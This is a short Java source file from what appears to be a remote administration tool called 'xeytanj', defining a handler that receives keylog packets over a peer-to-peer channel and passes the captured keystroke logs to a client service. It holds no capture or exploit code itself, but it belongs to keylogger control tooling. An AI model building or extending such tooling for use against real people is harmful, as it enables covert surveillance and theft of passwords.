package com.melardev.xeytanj.services.net.transport.p2p.handlers;

import com.melardev.xeytanj.enums.ServiceType;
import com.melardev.xeytanj.net.packets.PacketKeylog;
import com.melardev.xeytanj.services.net.PacketHandler;
import com.melardev.xeytanj.services.net.transport.p2p.P2PClientService;


public class KeylogPacketHandler extends Thread implements PacketHandler<PacketKeylog> {

    private P2PClientService clientService;

    public KeylogPacketHandler(P2PClientService p2PClientService) {
        this.clientService = p2PClientService;
    }

    @Override
    public ServiceType getServiceType() {
        return ServiceType.KEYLOG;
    }


    @Override
    public void handlePacket(PacketKeylog packet) {
        this.clientService.onKeylogDataReceived(packet.getLogs());
    }
}
